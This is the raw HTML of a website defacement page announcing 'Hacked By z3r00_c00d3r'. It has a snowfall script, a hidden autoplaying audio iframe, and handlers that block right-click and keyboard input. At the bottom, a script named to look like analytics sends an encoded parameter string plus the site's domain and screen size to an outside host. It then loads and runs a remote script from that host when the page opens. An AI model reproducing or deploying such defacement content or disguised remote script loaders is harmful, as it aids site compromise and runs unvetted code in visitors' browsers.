<!doctype html>
<html>
<head>
<title>&#1203;&#824;&#1202;&#824;&#1203; z3r00_c00d3r &#1203;&#824;&#1202;&#824;&#1203;</title>
<link rel='SHORTCUT ICON'             href='https://www.cia.gov/library/publications/the-world-factbook/graphics/flags/large/id-lgflag.gif'>
</head>
<iframe width='1' height='1' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/playlists/324346839&amp;auto_play=true&amp;loop=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;visual=true'></iframe>
<script type="text/javascript">

var snowmax=35
var snowcolor=new Array("#AAAACC","#DDDDFF","#CCCCDD","#F3F3F3","#F0FFFF")
var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")
var snowletter="*"
var sinkspeed=0.6
var snowmaxsize=22
var snowminsize=8
var snowingzone=1

// Do not edit below this line
var snow=new Array()
var marginbottom
var marginright
var timer
var i_snow=0
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent 
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
var ns6=document.getElementById&&!document.all
var opera=browserinfos.match(/Opera/)  
var browserok=ie5||ns6||opera

function randommaker(range) {		
	rand=Math.floor(range*Math.random())
    return rand
}

function initsnow() {
	if (ie5 || opera) {
		marginbottom = document.body.clientHeight
		marginright = document.body.clientWidth
	}
	else if (ns6) {
		marginbottom = window.innerHeight
		marginright = window.innerWidth
	}
	var snowsizerange=snowmaxsize-snowminsize
	for (i=0;i<=snowmax;i++) {
		crds[i] = 0;                      
    	lftrght[i] = Math.random()*15;         
    	x_mv[i] = 0.03 + Math.random()/10;
		snow[i]=document.getElementById("s"+i)
		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
		snow[i].size=randommaker(snowsizerange)+snowminsize
		snow[i].style.fontSize=snow[i].size
		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
		snow[i].sink=sinkspeed*snow[i].size/5
		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
		snow[i].style.left=snow[i].posx
		snow[i].style.top=snow[i].posy
	}
	movesnow()
}

function movesnow() {
	for (i=0;i<=snowmax;i++) {
		crds[i] += x_mv[i];
		snow[i].posy+=snow[i].sink
		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
		snow[i].style.top=snow[i].posy
		
		if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
			if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
			if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
			if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
			if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
			snow[i].posy=0
		}
	}
	var timer=setTimeout("movesnow()",50)
}

for (i=0;i<=snowmax;i++) {
	document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
}
if (browserok) {
	window.onload=initsnow
}
</script>
<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' bgcolor="black" >
<p></p>

<h></h>
<h6>z3r00_c00d3r</h6>
<p>z3r00_c00d3r</p>
<h6>z3r00_c00d3r</h6>
<p>z3r00_c00d3r</p>
<h6>z3r00_c00d3r</h6>
<center><font color="white" font size="20" font face="Impact">Hacked By z3r00_c00d3r</font></center>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKhb2eYY0amjnVAG%2fFHE3XKbgy6Gjls1eo7K0xaBFOGTfR%2fVLlZttD9tf5tDdMWuglHYgw1sum5VzPBIezBOXdIm7n%2fa2mve0OwdSMWdnDzpoecC6iZKbLa8fvGnjnAgnp08Eu4%2f9EpAM%2bzYuAzxvLGQEeD7JRO97naOiSOPWtLXw%2bU7owaLbMmh3OLvQIUWqX0ZrgsYZRGy7hrveYs%2fQFGCaHD0cgbMGwHakcEQqAxizzOekib0HyRTGWUUwv8dLUn%2bksZhBrdoxLzyYaOptc1KGdP%2fsj%2bgxyH7pwoEnx1emhF16HXcbGyCvlrpIb3Eb%2b6Okqa35ps%2bwRcTH54gFHLvlRq9mpnLYyeP6M9ZFBZ0QEOZCj87aPJPXLONT5NnZ7CqO9PxDjLhm8n%2bqZV0QXhRX75AXIG4yue8LqPudJNsXgG%2bhA4NVUyZoNTDT%2b9OiGjj6K1o0tCn8mI2xge9oG8D%2b%2fCnGQeTEc8MawxXSZ88g3%2fNYKcXVafKv5IOp7yfERWwiX2Mc9pJr9TbFePxMWp4hJKAsH87aO" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</body>
</html>
